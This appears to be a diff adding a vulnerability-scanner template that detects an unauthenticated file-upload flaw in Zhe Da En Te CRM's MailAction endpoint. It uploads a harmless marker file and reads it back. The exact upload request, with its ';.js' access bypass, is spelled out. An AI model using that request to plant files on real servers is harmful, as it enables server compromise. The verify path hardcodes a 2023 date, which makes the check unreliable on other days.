@@ -1,0 +1,62 @@
+id: zhe-da-en-te-crm-mailaction-file-upload
+info:
+  name: Zhe Da En Te CRM MailAction File Upload Vulnerability
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    This template detects a file upload vulnerability in Zhe Da En Te Customer Resource Management System's MailAction component.
+
+variables:
+  t1: "{{rand_text_alphanumeric(4)}}"
+  t2: "{{md5(t1)}}"
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/entsoft/MailAction.entphone;.js?act=saveAttaFile"
+    headers:
+      User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36
+      Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryqO6sfIPwABq9ApjJ
+    body: |-
+      ------WebKitFormBoundaryqO6sfIPwABq9ApjJ
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.txt"
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundaryqO6sfIPwABq9ApjJ--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t1}}"
+          - "上传成功"
+        part: body
+    extractors:
+      - type: regex
+        name: t3
+        internal: true
+        group: 1
+        regex:
+          - "[0-9]{25}"
+
+  - id: verify-file
+    method: GET
+    path:
+      - "{{BaseURL}}/enterdoc/EnterMail/20231120/{{t3}}/{{t1}}.txt"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{t2}}"
+        part: body
